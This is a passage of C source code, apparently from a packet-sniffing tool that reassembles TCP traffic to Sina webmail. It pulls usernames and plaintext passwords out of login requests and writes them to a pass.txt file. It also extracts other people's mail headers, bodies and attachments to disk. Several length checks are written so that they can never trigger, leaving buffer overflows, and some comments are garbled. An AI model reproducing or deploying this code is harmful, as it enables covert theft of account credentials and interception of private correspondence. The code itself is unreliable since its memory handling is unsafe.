		if(range>=MAX_UN_LEN && range <=0) return;
		strncpy(mail_info->username,p1,p2-p1);
		mail_info->username[range]=0;
		strcat(mail_info->username,"@vip.sina.com");
		p1=p2;
		p1=strstr(p1,"&psw=");
		if(!p1) return;
		p1+=5;
		if(!(p2=strstr(p1,"&")))
			strcpy(mail_info->passwd,p1);
		else{
			range=p2-p1;
			if(range>=MAX_UN_LEN && range<=0) return;
			strncpy(mail_info->passwd,p1,range);
			mail_info->passwd[range]=0;
		}
	}

	write_xml(mail_info);

	FILE *fp;
	char passpath[MAX_PATH_LEN];
	sprintf(passpath,"%s/pass.txt",mail_data_path);
	//chdir(mail_data_path);
	fp = fopen(passpath,"a+");
	if(fp==NULL) return;
	fprintf(fp,"\nusername=%s\npassword=%s\n",mail_info->username,mail_info->passwd);
	fclose(fp);
}
int analyse_sina_psword(Mail_info *mail_info,char *data,unsigned int datalen,struct tcphdr *tcp,int is_b_s)
{
	unsigned  int  seq = ntohl(tcp->seq);
	int off_seq = seq - mail_info->start_seq;
	int range;
	char http_ok_head[11] = "HTTP/1.1 ";
	if(is_b_s) 
	{
		if(!mail_info ->is_complished){
			if (mail_info->mail_length == 0) {
				mail_info->mail_length = 5000;
				mail_info->mail_data = (char *)malloc(5000);
				if(mail_info->mail_data == NULL){
					return -1;
				}
				memset(mail_info->mail_data,0,5000);
				mail_info->start_seq = seq;
			}
			if(mail_info->mail_length == 5000) {
				int len;
				char *tmp = NULL;
				len = get_http_length(data);
				if (len > 0) {
					mail_info->mail_length += len;
					tmp = (char *)malloc((size_t)mail_info->mail_length);
					if(tmp==NULL){
						return -1;
					}
					memset(tmp,0,mail_info->mail_length);
					memcpy(tmp,mail_info->mail_data,5000);
					free(mail_info->mail_data);
					mail_info->mail_data = tmp;
				}
			}
			off_seq = seq - mail_info->start_seq;
			range=off_seq+datalen;
			if(range>mail_info->mail_length){
				return -1;
			}
			memcpy(mail_info->mail_data+off_seq,data,datalen);
		}
	}
	else if(!strncmp(data,http_ok_head,9))
	{
		char *host_p;
		mail_info->is_complished = 1;

		host_p = strstr(mail_info->mail_data,"Host: ");
		if(host_p == NULL) {
			return -1;
		}
		if(memfind(host_p,"mail.sina.com.cn",50)!=NULL)
			write_sina_psword_common(mail_info);
		else if(memfind(host_p,"vip.sina.com.cn",50)!=NULL)
			write_sina_psword_vip(mail_info);
		 //write_sina_psword(mail_info);
		return -1;
	}
	return 0;
}

void write_sina_psword_com(Mail_info *mail_info)
{
	char *p1,*p2;
	int range;
	char tmp_name[MAX_UN_LEN + 1];
	p1 = mail_info->mail_data;
	p1 = strstr(p1,"&su=");
	if(!p1) return;
	p1 += 4;
	p2 = strstr(p1,"&");
	if(!p2) return;
	range = p2 -p1;
	if( range >= MAX_UN_LEN && range <= 0) return;
	strncpy(tmp_name,p1,p2-p1);
	tmp_name[p2-p1]=0;                  
	htmldecode_full(tmp_name, tmp_name);           
	//LOG_INFO("\ntmp_name = %s range = %d\n",tmp_name,range);
	range = strlen(tmp_name);
	char* username = Base2UTF8_mail(tmp_name,range);    
	//LOG_INFO("\nusername = %s\n",username);
	if (username == NULL) 
		return;
	htmldecode_full(username, mail_info->username);
	//LOG_INFO("\nmail_info->username = %s\n",mail_info->username);
	p1=p2;
	p2 = strstr(p1,"&sp=");
	if(!p2) return;
	p2+=4;
	p1 = strstr(p2,"&");
	if(!p1) return ;
	range = p1 - p2;
	if ( range >= MAX_PW_LEN && range <=0) return;
	strncpy(mail_info->passwd,p2,range);
	mail_info->passwd[range]=0;
	htmldecode_full(mail_info->passwd,mail_info->passwd);

	write_xml(mail_info);

	FILE *fp;
	char passpath[MAX_PATH_LEN];
	sprintf(passpath,"%s/pass.txt",mail_data_path);
	//chdir(mail_data_path);
	fp = fopen (passpath,"a+");
	if(fp ==NULL) return;
	//printf("username=%s\n", mail_info->username);
	//printf("password=%s\n", mail_info->passwd);
	fprintf(fp,"\nmail_info->username =%s\npassword=%s\n",mail_info->username,mail_info->passwd);
	fclose(fp);
}

int analyse_sina_psword_com(Mail_info *mail_info ,char *data,unsigned int datalen,struct tcphdr *tcp ,int is_b_s)
{//printf("function:analyse_sina_psword_com\n");
	unsigned int seq = ntohl(tcp->seq);
	int off_seq = seq - mail_info->start_seq;
	int range;
	char http_ok_head[11] = "HTTP/1.1 ";
	if(is_b_s){
		if(!mail_info->is_complished){
			if(mail_info->mail_length == 0){
				mail_info->mail_length = 5000;
				mail_info->mail_data = (char *) malloc (5000);
				if(mail_info->mail_data == NULL){
					return -1;
				}
				memset(mail_info->mail_data,0,5000);
				mail_info->start_seq = seq;
			}
			if (mail_info->mail_length == 5000){
				int len ;
				char *tmp;
				len = get_http_length(data);
				if (len>0){
					mail_info->mail_length += len;
					tmp = (char *)malloc((size_t)mail_info->mail_length);
					if(tmp == NULL){
						return -1;
					}
					memset(tmp ,0, mail_info->mail_length);
					memcpy(tmp ,mail_info->mail_data ,5000);
					free(mail_info->mail_data);
					mail_info->mail_data = tmp;
				}
			}
			off_seq = seq - mail_info->start_seq;
			range=off_seq+datalen;
			if(range>mail_info->mail_length){
				return -1;
			}
			memcpy(mail_info->mail_data+off_seq,data,datalen);
			if(strstr(mail_info->mail_data,"&sp="))
			{
				write_sina_psword_com(mail_info);
				return -1;
			}
		}
	}
	else if(!strncmp(data,http_ok_head,9))
	{
		mail_info->is_complished = 1;
		write_sina_psword_com(mail_info);
		return -1;
	}
	return 0;
}


void drop_nbsp(char *str)
{
	int i=0,j=0;
	if(str==NULL)  return;
	while(str[i]!='\0'){
		if(str[i]=='&'&&str[i+1]=='n'&&str[i+2]=='b'&&str[i+3]=='s'&&str[i+4]=='p'){
			str[j++]=' ';
			i+=6;
		}
		else{
			if(j<i) str[j]=str[i];
			i++;
			j++;
		}
	}
	str[j]='\0';
}
void  write_sina_recive_up(Mail_info * mail_info, int new_com)
{
	char *p1=NULL, *p2=NULL,*p3=NULL;
	
	int len;
	if(mail_info->recive_data == NULL)
		return;

	p1=strstr(mail_info->recive_data,"\"from\":\"");
	if(p1==NULL)
		return;
	p1+=8;
	p2=strstr(p1,"\",\"to\"");
	if(p2==NULL)
		return;
	len = p2- p1;
	if(len<0)
		return;
	if(len>MAX_FROM_LEN) 
		len=MAX_FROM_LEN;
	strncpy(mail_info->from,p1,len);
	mail_info->from[len]=0;
	p1=p2;
	clear_from(mail_info->from);

	p1+=8;
	p2=strstr(p1,"\",\"cc\"");
	if(p2==NULL)
		return;
	len = p2-p1;
	if(len>MAX_TO_LEN) 
		len=MAX_TO_LEN;
	strncpy(mail_info->to,p1,len);
	mail_info->to[len]=0;
	//strcpy(mail_info->to, clear_kh(mail_info->to, MAX_TO_LEN));
	drop_nbsp(mail_info->to);
	p1 = p2;

	p2+=8;
	p3=p2;
	p1=strstr(p1,"\",\"bcc\"");
	if(p1 == NULL)
	{
		p1=strstr(p3,"\",\"date\"");
	}
	if(p1)
	{
		len=p1-p3;
		if(len>MAX_CC_LEN) len=MAX_CC_LEN;
		strncpy(mail_info->cc,p3,len);
		//printf("mail_info->cc = %s\n", mail_info->cc);
		mail_info->cc[len]=0;
		//strcpy(mail_info->cc, clear_kh(mail_info->cc, MAX_CC_LEN));
		drop_nbsp(mail_info->cc);
	}
	p1=strstr(p2,"\"date\":\"");
	if(p1==NULL){
		char sendtime[100];
		memset(sendtime,0,100);
		p1=strstr(p2,"\"date\":");
		p1+=7;
		p2=strstr(p1,",\"");
		len=p2-p1;
		strncpy(sendtime,p1,len);
		sendtime[len]=0;
		memset(mail_info->sent_time,0,MAX_TIME_LEN + 1);
		convert_time_to_string(atoi(sendtime),mail_info->sent_time);
	}
	else{
		p1+=8;
		p2=strstr(p1,"\",\"");
		if(p2==NULL) return;
		len=p2-p1;
		if(len>MAX_TIME_LEN) len=MAX_TIME_LEN;
		strncpy(mail_info->sent_time,p1,len);
		//printf("sent_time: %s\n", mail_info->sent_time);
		mail_info->sent_time[len]=0;
	}
    
	p1=strstr(p2,"\"subject\":\"");
	if(p1==NULL){
		return;}
	p1+=11;
	p2=strstr(p1,"\",\"");
	if(p2==NULL){
		return;}
	len=p2-p1;
	if(len>MAX_SUBJ_LEN) len=MAX_SUBJ_LEN;
	strncpy(mail_info->subject,p1,len);
	//printf("subject: %s\n", mail_info->subject);
	mail_info->subject[len]=0;
	drop_nbsp(mail_info->subject);
	clear_tag(mail_info->subject);

	p1=strstr(p2,"\"body\":\"");
	if(p1==NULL){
		return;}
	p1+=8;
	p2=strstr(p1,"\",\"");
	if(p2==NULL){
		return;}
	len=p2-p1;
	char * temp = (char *)malloc(len + 1);
	memset(temp, 0, len + 1);
	memcpy(temp, p1, len);
	mail_info->content = clear_html_tag(temp);
	free(temp);
	temp = NULL;
	clear_tag(mail_info->content);

	p1=strstr(p2,"mid\":\"");
	if(p1==NULL){
		return;}
	p1+=6;
	p2=strstr(p1,"\",");
	if(p2==NULL){
		return;}
	len=p2-p1;
	if(len>MAX_ID_LEN){
		return;}
	strncpy(mail_info->connect_id,p1,len);
	//printf("connect_id: %s",mail_info->connect_id);
	mail_info->connect_id[len]=0;
	memcpy(mail_info->mail_id,mail_info->connect_id,len);
	mail_info->mail_id[len]=0;

	create_dir(mail_info->save_path,"sina",mail_info->from);
	write_to_file(mail_info);
	//delete_mail_info(mail_info);
	//yanglei: analyse mail_info->to, if it is "sina.cn", then write_sina_recive_down;
	/*char * buf = "@sina.cn";
	p1 = strstr(mail_info->to, buf);
	if((p1 != NULL) || (new_com == 1))
	{
		//printf("p1 is not NULL!\n");
		write_sina_recive_down(mail_info, new_com);
	}*/
}

void write_sina_recive_down(Mail_info *mail_info, int new_com)
{
	Mail_info *mail_org = NULL;
	char *p1=NULL;
	char *p2=NULL;
	int len;
	p1=strstr(mail_info->recive_data,"<body");
	if(p1==NULL) 
	{
		//printf("not str named <dody>\n");
		return;
	}
	p1+=5;
	p1=strstr(p1,">");
	p1+=1;
	p2=strstr(p1,"</body>");
	if(p2==NULL) 
	{
		//printf("not str named </body>\n");
		return;
	}
	len =p2-p1;
	if(len<0) 
	{
		//printf("len < 0\n");
		return;
	}
	if(mail_info->connect_id[0]=='\0') 
	{
		//printf("mail_info->connect_id[0]=='\0'\n");
		return;
	}
	mail_org = find_mail_head(mail_info->connect_id,mail_info);
	//yanglei: 12.24 modify
	if(mail_org == NULL) 
	{
		//printf("mail_org == NULL\n");
	
		char* buf = "@sina.cn";
		p1 = strstr(mail_info->to, buf);
		if((p1 != NULL) || (new_com == 1))
		{
			//printf("mail_info->mail_data = %s\n", mail_info->mail_data);

			p1 = strstr(mail_info->recive_data,"<body");
			if(p1 == NULL) 
			{
				//printf("not str named <dody>\n");
				return;
			}
			p1+=5;
			p1=strstr(p1,">");
			p1+=1;
			p2 = strstr(p1,"</body>");
			if(p2 == NULL) 
			{
				//printf("not str named </body>\n");
				return;
			}
			len = p2 - p1;
	
			mail_info->mail_data = (char *)malloc(len + 1);
			memset(mail_info->mail_data, 0, len + 1);
			memcpy(mail_info->mail_data, p1, len);
			mail_info->content = clear_html_tag(mail_info->mail_data);	
			create_dir(mail_info->save_path, "sinacn", mail_info->from);
			write_to_file(mail_info);
			//delete(mail_info);	
		}
		else
		{
			return;
		}
	}
	
	if(mail_org != NULL)
	{
		mail_org->mail_data =(char *)malloc (len+1);
	}

	if(mail_org != NULL) 
	{
		memset(mail_org->mail_data,0,len+1);
		memcpy(mail_org->mail_data,p1,len);
		mail_org->content=clear_html_tag(mail_org->mail_data);
		create_dir(mail_org->save_path,"sina",mail_org->from);
		write_to_file(mail_org);
		delete_mail_info(mail_org);
	}
}

int write_sina_recive_m(Mail_info *mail_info)
{
    cJSON *root = NULL, *node = NULL, *array_node = NULL;
    
    root = cJSON_Parse(mail_info->recive_data);
    if (!root)
        return -1;

    node = cJSON_GetObjectItem(root, "data");
    if (node)
    {
        if (node->type == cJSON_Array)
        {
            //int array_size = 0;
            //array_size = cJSON_GetArraySize(node);
            //printf("size:%d\n", array_size);

            // get mail sender
            array_node = cJSON_GetArrayItem(node, 1);
            if (array_node->type == cJSON_String)
            {
                strncpy(mail_info->from, array_node->valuestring, MAX_FROM_LEN);
                clear_from(mail_info->from);
            }

            // get mail receiver
            array_node = cJSON_GetArrayItem(node, 2);
            if (array_node->type == cJSON_String)
            {
                strncpy(mail_info->to, array_node->valuestring, MAX_TO_LEN);
                drop_nbsp(mail_info->to);
            }

            // get mail subject
            array_node = cJSON_GetArrayItem(node, 3);
            if (array_node->type == cJSON_String)
            {
                strncpy(mail_info->subject, array_node->valuestring, MAX_SUBJ_LEN);
            }
            
            // get sent time
            array_node = cJSON_GetArrayItem(node, 4);
            if (array_node->type == cJSON_Number)
            {
                convert_time_to_string(array_node->valueint, mail_info->sent_time);
            }

            //get mail content
            array_node = cJSON_GetArrayItem(node, 25);
            if (array_node->type == cJSON_String)
            {
                mail_info->content = clear_html_tag(array_node->valuestring);
                clear_tag(mail_info->content);
            }
            else
            {
                // not find content, return
                cJSON_Delete(root);
                return -1;
            }
        }
    }
        
    cJSON_Delete(root);

    create_dir(mail_info->save_path, "sina", mail_info->from);
	write_to_file(mail_info);

    return 0;
}

int analyse_sina_recive_m(Mail_info *mail_info, char *data, unsigned int datalen, struct tcphdr *tcp, int is_b_s)
{
    if (is_b_s == 0)
    {
        int f = http_recive_mail(mail_info,data,datalen);
        if (1 == f)
        {
            if (strstr(mail_info->header, "Content-Encoding: gzip"))
            {
                char *dest = NULL;
                int result = decomp_gzip(mail_info->body, mail_info->bodyLen - 2, &dest);
                if (result == -1 || dest == NULL)
                {
                    return -1;
                }
                
                free(mail_info->body);
                mail_info->body = NULL;
                mail_info->recive_data = dest;
                dest = NULL;
                write_sina_recive_m(mail_info);
                return -1;
            }
        }
        else if (f < 0)
            return -1;
    }
    
    return 0;
}

int analyse_sina_recive(Mail_info *mail_info,char *data, unsigned int datalen,struct tcphdr *tcp,int is_b_s,int new_com)
{  
    if (is_b_s == 0)
    {
        int f = http_recive_mail(mail_info,data,datalen);
        if (1 == f)
        {
            if (strstr(mail_info->header, "Content-Encoding: gzip"))
            {
                char *dest = NULL;
                int result = decomp_gzip(mail_info->body, mail_info->bodyLen - 2, &dest);
                if (result == -1 || dest == NULL)
                {
                    return -1;
                }
                
                free(mail_info->body);
                mail_info->body = NULL;
                mail_info->recive_data = dest;
                dest = NULL;
                write_sina_recive_up(mail_info, new_com);
                return -1;
            }
        }
        else if (f < 0)
            return -1;
    }
    
    return 0;
}

int analyse_sina_recive_down(Mail_info *mail_info,char *data,unsigned int datalen,struct tcphdr *tcp,int is_b_s,int new_com)
{   //read ..lihan
	unsigned int seq=ntohl(tcp->seq);
	int off_seq=seq-mail_info->start_seq;
	int range;
	int len;
	char *p1=NULL,*p2=NULL;
	char *p=NULL;
	if(is_b_s && mail_info->connect_id[0]=='\0'){
		p1=strstr(data,"mid=");
		if(p1==NULL) return -2;
		p1+=4;
		p2=strstr(data," HTTP/1.1");
		if(p2==NULL) return -1;
		len=p2-p1;
		if(len>MAX_ID_LEN) return -1;
		strncpy(mail_info->connect_id,p1,len);
		mail_info->connect_id[len]=0;
		if(len>60){ //vip
			p2=strstr(p1,"&fid=");
			if(p2==NULL) return -1;
			len=p2-p1;
			strncpy(mail_info->connect_id,p1,len);
			mail_info->connect_id[len]=0;
		}
	}else if(!is_b_s){
		if(!strncmp(data,"HTTP/1.",7)){
			mail_info->recive_length=get_http_length(data);
			if(mail_info->recive_length<=0){
				return -1;
			}
			mail_info->recive_length +=20;
			mail_info->recive_data=(char *)malloc(mail_info->recive_length);
			if(mail_info->recive_data ==NULL){
				return -1;
			}
			p=strstr(data,"\r\n\r\n");
			if(p==NULL){
				return -1;
			}
			p+=4;
			len = datalen-(p-data);
			mail_info->http_seq = seq+p-data;
			if(len<0||mail_info->recive_length <len) {
				return -1;
			}
			memset(mail_info->recive_data,0,mail_info->recive_length);
			memcpy(mail_info->recive_data,p,len);
			if(tcp->fin == 1){
				write_sina_recive_down(mail_info, new_com);
				del_mail_node(mail_info);
			}
		}else if(mail_info->recive_data !=NULL){
			off_seq = seq-mail_info->http_seq;
			range =off_seq+datalen;
			if(range>mail_info->recive_length){
				return -1;
			}
			memcpy(mail_info->recive_data+off_seq,data,datalen);
			if(tcp->fin == 1||strstr(data+datalen-10,"</html>")) {
				write_sina_recive_down(mail_info,new_com);
				del_mail_node(mail_info);
			}
		}
	}
	return 0;
}
void drop_ttt(char *from)
{
	if(from==NULL) return;
	char *p=from;
	while(*p!='\0'&&*p!='\x0a'){
		p++;
	}
	if(*p=='\x0a') *p='\0';
}

void write_sinavip_recive_file(Mail_info *mail_info)
{
	//printf("aaaaaaaaaaaaaaaaaaaaa\n");
	char *p1=NULL, *p2=NULL, *p3=NULL;
	int  len;
	int flag=0;
	p1 = mail_info->recive_data+10000;
	if(p1 == NULL)
		return;
	p2 = strstr(p1,"mailhinfo_table\"><tbody>");
	if(p2 == NULL) return ;
	p2 +=15;
	p1 = strstr(p2,"</tbody></table>");
	if(p1 == NULL)  return ;
	*p1='\0';
     
	p1=strstr(p2,"<em>");
	if(p1==NULL) return ;
	p1 +=4;
	p2 =strstr(p1,"<span class");
	if(p2 ==NULL) return;
	*p2++='\0';
	if(p3=strstr(p1,"&gt;")){
		p3+=4;
		len=p3-p1;
	}else{
		len=p2-p1;
	}
	if(len>MAX_FROM_LEN) len=MAX_FROM_LEN;
	strncpy(mail_info->from,p1,len);
	mail_info->from[len]=0;
	drop_nbsp(mail_info->from);
	 
	clear_from(mail_info->from);
	drop_ttt(mail_info->from);

	p1=strstr(p2,"&mid=");
	if(p1==NULL) return;
	p1+=5;
	p2=strstr(p1,"\" ");
	if(p2==NULL) return;
	len=p2-p1;
	if(len>MAX_ID_LEN) return;
	strncpy(mail_info->connect_id,p1,len);
	mail_info->connect_id[len]=0;

	p1 =strstr(p2,"<em>");
	if(p1==NULL) return;
	p1+=4;
	p2=strstr(p1,"</em>");
	if(p2==NULL) return;
	len=p2-p1;
	if(len>MAX_TO_LEN) len = MAX_TO_LEN;
	strncpy(mail_info->to,p1,len);
	mail_info->to[len]=0;
	drop_nbsp(mail_info->to);

	p1=strstr(p2,"<em>");
	if(p1==NULL) return;
	p1+=4;
	p2=strstr(p1,"</em>");
	if(p2==NULL) return;
	*p2='\0';
	p3=p2;
	p2+=4;
	if(strstr(p1,"@")){
		len=p3-p1;
		if(len>MAX_CC_LEN) len=MAX_CC_LEN; 
		strncpy(mail_info->cc,p1,len);
		mail_info->cc[len]=0;
		drop_nbsp(mail_info->cc);
		flag=1;
	}else {
		len=p3-p1;
		if(len>MAX_TIME_LEN) len=MAX_TIME_LEN;
		strncpy(mail_info->sent_time,p1,len);
		mail_info->sent_time[len]=0;
	}

	if(flag==1){
		p1=strstr(p2,"<em>");
		if(p1==NULL) return;
		p1+=4;
		p2=strstr(p1,"</em>");
		if(p2==NULL) return;
		len=p2-p1;
		if(len>MAX_TIME_LEN) len=MAX_TIME_LEN;
		strncpy(mail_info->sent_time,p1,len);
	}

	p1=strstr(p2,"id=\"subjectValue\"");
	if(p1==NULL) return;
	p1+=26;
	p2=strstr(p1,"</strong>");
	if(p2==NULL) return;
	len=p2-p1;
	if(len>MAX_SUBJ_LEN) len=MAX_SUBJ_LEN;
	strncpy(mail_info->subject,p1,len);
	mail_info->subject[len]=0;
	drop_nbsp(mail_info->subject);
	 
}

int get_mid_1(Mail_info *mail_info,char *str_id)
{
	char patternmid[]="mid=(.*)&fid=";
	int result;
	result=regcompile_1(mail_info->mail_data,patternmid,str_id,MAX_ID_LEN);
	return result;
  
}

int get_mid_2(char * src, char *str_id)
{
	char patternmid[]="mid=(.*)&content_type=";
	int result;
	result=regcompile_1(src,patternmid,str_id,MAX_ID_LEN);
	return result;
}

#if 0
int write_sina_attach_down(Mail_info *mail_info,unsigned int length, int is_chunk)
{

   printf("function:write_sina_attach_down\n");  
   mode_t file_mode = S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH;
   char *p1 = mail_info->recive_data;
   char *p2;
   char filename[MAX_FN_LEN]="0";
   int len; 
   char tmpname[MAX_FN_LEN]="0"; 
   p2 = strstr(p1,"attachment; filename=\"");
   if(p2==NULL)
     return;
   p1 = p2;
   p1 += 22;
   p2 = strstr(p1,"\"\r\n");
   if(p2==NULL) return;
   len = p2-p1;
   if(len>MAX_FN_LEN) len=MAX_FN_LEN;
   strncpy(tmpname,p1,len);
   tmpname[len] = 0;
   htmldecode_full(tmpname,filename);
   
   p1 = strstr(p2, "\r\n\r\n");
   if(p1==NULL) return ;
   p1 +=4;
   
   char str[MAX_PATH_LEN];
   struct timeval tv;
   struct timezone tz;
   gettimeofday(&tv,&tz);
   snprintf(str, MAX_PATH_LEN, "%s/%lu-%lu_%s", attach_down_path, tv.tv_sec, tv.tv_usec,filename);
      
   int fd;
   
   fd = open(str, O_RDWR | O_CREAT, file_mode);
   if(!is_chunk)
{
     write(fd, p1, length);
     close(fd);
}
   else
{
     p1=strstr(p1,"\r\n");
     if(p1==NULL) return -1;
     p1 += 2;
     write(fd,p1,length);
     close(fd);
     
}
   
   char str_file[MAX_PATH_LEN];
   snprintf(str_file, MAX_PATH_LEN, "%lu-%lu_%s",tv.tv_sec, tv.tv_usec, filename);
   
   UpdateAttach(str_file, mail_info->mail_id);
   del_mail_node(mail_info);
   
   
   
}
#endif

int analyse_sina_attachzip_recive(Mail_info *mail_info,char *data,unsigned int datalen,struct tcphdr *tcp, int is_b_s)
{
	unsigned int seq=ntohl(tcp->seq);
	int off_seq=seq-mail_info->start_seq;
	int range, n;
	unsigned int attach_len;
	if (is_b_s)
	{//1
		if(!mail_info->is_complished)
		{//2
			if (mail_info->mail_length==0)
			{
				mail_info->mail_length = 5000;
				mail_info->mail_data = (char *)malloc(5000);
				if(mail_info->mail_data==NULL)
				{
					return -1;
				}
				memset(mail_info->mail_data,0,5000);
				mail_info->start_seq = seq;
			}
			if(mail_info->mail_length == 5000)
			{//3
				int len; //???
				char *tmp;
				len = get_http_length(data);
				if (len>0)
				{
					mail_info->mail_length+=len;
					tmp=(char *)malloc(mail_info->mail_length);
					if(tmp==NULL)
					{
						return -1;
					}
					memset(tmp,0,mail_info->mail_length);
					memcpy(tmp,mail_info->mail_data,5000);
					free(mail_info->mail_data);
					mail_info->mail_data = tmp;
				}
			}//3
			off_seq = seq - mail_info->start_seq;
			range = off_seq+datalen;
			if(range>mail_info->mail_length)
			{
				return -1;
			}
			memcpy(mail_info->mail_data+off_seq,data,datalen);
           
		}
	} 
	else
	{
		if(!strncmp(data, "HTTP/1.1 200 OK\r\n",15))
		{//1
			char tmp_id[MAX_ID_LEN+1];
			int result;
			result=get_mid_1(mail_info,tmp_id);
			if (result==-1) return -1;
			htmldecode_full(tmp_id,mail_info->mail_id);
                    
			mail_info->recive_length=get_http_length(data);
			n=judge_chunk(data);
			attach_len = mail_info->recive_length;
			if(mail_info->recive_length<=0)
			{
				return -1;
			}
          
			mail_info->recive_length+=1000;
			mail_info->recive_data=(char *)malloc(mail_info->recive_length);
          
			if(mail_info->recive_data==NULL)
			{
				return -1;
			}
			memset(mail_info->recive_data,0,mail_info->recive_length);
			mail_info->http_seq=seq;
          
		}//1
		if(mail_info->recive_data!=NULL)
		{
			off_seq = seq-mail_info->http_seq;
			range = off_seq+datalen;
			if(range>mail_info->recive_length)
			{
				return -1;
			}
			memcpy(mail_info->recive_data+off_seq,data,datalen);
		}
		if(tcp->fin==1)
		{
			mail_info->is_complished =1;
			//printf("attach_len = %d\n", attach_len);
			write_attach_down(mail_info,attach_len,n);
			del_mail_node(mail_info);
		}
	}
	return 0;
}
//yanglei
int analyse_sinacn_attach_head(Attach_info *attach_info, char *data, unsigned int datalen,unsigned int seq)
{
	int fd = 0;
	struct timeval tv;
	struct timezone tz;
	char *p1 = NULL;
	char *p2 = NULL;
	int off_seq = 0;
	int result = 0;
	int range = 0;
	
	off_seq = seq - attach_info->start_seq;
	if(off_seq < 0) 
	{
		//printf("start_seq = %d\n",off_seq);
		return -1;
	}
	range = off_seq + datalen;
	if(range > attach_info->ok_len)
	{
		del_attach_node(attach_info);
		delete_attach(attach_info);
		return -1;
	}
	
	memcpy(attach_info->ok_data + off_seq, data, datalen);
	
	p1 = strstr(attach_info->ok_data,"filename=\"");
	if(p1 == NULL) 
	{
		return 0;
	}
	p1 += 10;
	p2 = strstr(p1,"\r\n----");
	if(p2 == NULL) return 0;
	int len=0;
	len = p2 - p1;
	if (len>MAX_PATH_LEN) len=MAX_PATH_LEN;
	memcpy(attach_info->attach_name,p1,len);
	//printf("attach_name = %s\n", attach_info->attach_name);
	attach_info->attach_name[len]=0;
	p1 = strstr(p2,"name=\"key\"");
	if(p1 == NULL) return 0;
	p1+=14;
	p2 = strstr(p1,"\r\n----");
	if (p2 == NULL) return 0;
	len = p2 - p1;
	if (len > MAX_ID_LEN) len = MAX_ID_LEN;
	strncpy(attach_info->ID_str,p1,len);
	p1 = strstr(p2,"; filename=\"");
	if (p1 == NULL) return 0;
	p1 = strstr(p1,"\r\n\r\n");
	if (p1 == NULL) 
	{
		return -1;
	}

	p1 += 4;
	attach_info->start_seq = p1 - attach_info->ok_data + attach_info->start_seq;
	gettimeofday(&tv,&tz);
	sprintf(attach_info->path_of_here,"%s/%lu-%lu",attach_down_path,tv.tv_sec,tv.tv_usec);
	mode_t file_mode = S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH;
	fd = open(attach_info->path_of_here,O_RDWR | O_CREAT, file_mode);
	write(fd,p1,off_seq + datalen - (p1-attach_info->ok_data));
	close(fd);
	free(attach_info->ok_data);
	attach_info->ok_data = NULL;
	attach_info->is_writing = 1;
	return 0;
		 
}


int WriteAttachFilesinacn(Mail_info *mail_info) 
{
    //according to the http information head, this function added
	get_21cn_from(mail_info->mail_data,mail_info->from);
	char *p1=mail_info->mail_data;
	char *p2;
	int fd;
   
	char filename[MAX_FN_LEN]="0";
	int len=0;
	mode_t file_mode=S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH;
	create_dir(mail_info->save_path,"sinacn",mail_info->from);
   
	p1=strstr(p1,"filename=\"");
	if (p1==NULL) return (-1);
	p1+=10;
	p2=strstr(p1,"\"\r\n");
	if (p2==NULL) return (-1);
	len=p2-p1;
	if (len>MAX_PATH_LEN) return (-1);
#if 0
   int i;
   for(i=0; i<len;i++)
       filename[i]=*(p1+i);
   filename[len]=0;
#endif
   strncpy(filename,p1,len);
   char str[MAX_PATH_LEN];
   fd=open(str,O_RDWR|O_CREAT,file_mode);
   p2+=3;
   p1=strstr(p2,"\r\n\r\n");
   if (p1==NULL) return (-1);
   p1+=4;
   
   unsigned int n=mail_info->mail_length-(p1-mail_info->mail_data);
   p2=memfind(p1,"Content-Disposition",n);
#if 0
   p2=strstr(p1,"Content-Disposition");//not accurate
   if (p2==NULL)
{
      return;
}
#endif
   write(fd,p1,p2-p1);
   close(fd);
   trim_attach(str,45);//use???
     
}

//void write_attachcn_file(Mail_info *mail_info, char *ID_str, char *attach_name)
void write_attachcn_file(Mail_info *mail_info)
{
	//printf("data = %s\n",mail_info->mail_data);
	char *SWEBAPPSESSID;
	char *ATTACH_NAME;
	char *attach_data;
	int len;
	int attach_len;
	char *p1 = NULL;
	char *p2 = NULL;
	
	p1 =strstr(mail_info->mail_data,"Type: application/octet-stream\r\n\r\n");
	if(p1 == NULL)
	{
		return;
	}
	p1+=34;
	p2 = strstr(p1, "\r\nContent-Disposition: form-data; name=\"Upload\"");
	
	if(p2 != NULL)
	{
		len = p2 - p1;
		attach_len = len;
		int datalen = len;
		attach_data = (char*)malloc(len+1);	
		memset(attach_data, 0, len+1);
		memcpy(attach_data, p1, p2 - p1);
	}

/*	p1 = strstr(mail_info->mail_data,"SWEBAPPSESSID=");	
	if(p1 == NULL)
	{
	return;
}
	p1+=14;
	p2 = strstr(p1, "\r\n");
	if(p2 == NULL)
	{
	return ;
}
	SWEBAPPSESSID = (char*)malloc(len+1);
	len = p2 - p1;
	memset(SWEBAPPSESSID, 0, len);
	memcpy(SWEBAPPSESSID, p1, p2 - p1);
	printf("SWEBAPPSESSID = %s\n", SWEBAPPSESSID);

	Attach_info *attach_info;
	mail_info->attach_id = (char*)malloc(len);
	memset(mail_info->attach_id, 0 ,len);
	memcpy(mail_info->attach_id,SWEBAPPSESSID,len);
	printf("len + 1 = %d\n", len);
	printf("mail_info->attach_id = %s\n", mail_info->attach_id);*/
	
	p1 =strstr(mail_info->mail_data,"name=\"Filedata\"; filename=\"");
	if(p1 == NULL)
	{
		return;
	}
	p1+=27;
	p2 = strstr(p1, "\"\r\n");
	if(p2 == NULL)
	{
		return;
	}
	len = p2 - p1;
	ATTACH_NAME = (char*)malloc(len+1);
	memset(ATTACH_NAME, 0, len);
	memcpy(ATTACH_NAME, p1, p2 - p1);
	//printf("ATTACH_NAME = %s\n", ATTACH_NAME);
	
	mail_info->attach_name = (char*)malloc(len);
	memset(mail_info->attach_name, 0 ,len);
	memcpy(mail_info->attach_name,ATTACH_NAME,len);
	//printf("mail_info->attach_name = %s\n", mail_info->attach_name);

	char str[MAX_PATH_LEN];
	struct timeval tv;
	struct timezone tz;
	gettimeofday(&tv,&tz);
	mode_t file_mode = S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH;//表示????
	snprintf(str, MAX_PATH_LEN, "%s/%lu-%lu_%s", mail_temp_path, tv.tv_sec, tv.tv_usec,ATTACH_NAME);
	//printf("str = %s\n", str);	
	
	int fd;
	p1 =strstr(mail_info->mail_data,"Type: application/octet-stream\r\n\r\n");
	if(p1 == NULL)
	{
		return;
	}
	p1+=34;
	fd = open(str, O_RDWR | O_CREAT, file_mode);//以�?�读???��???��???件�?str?��??��???件�??路�?
	write(fd, p1, attach_len);
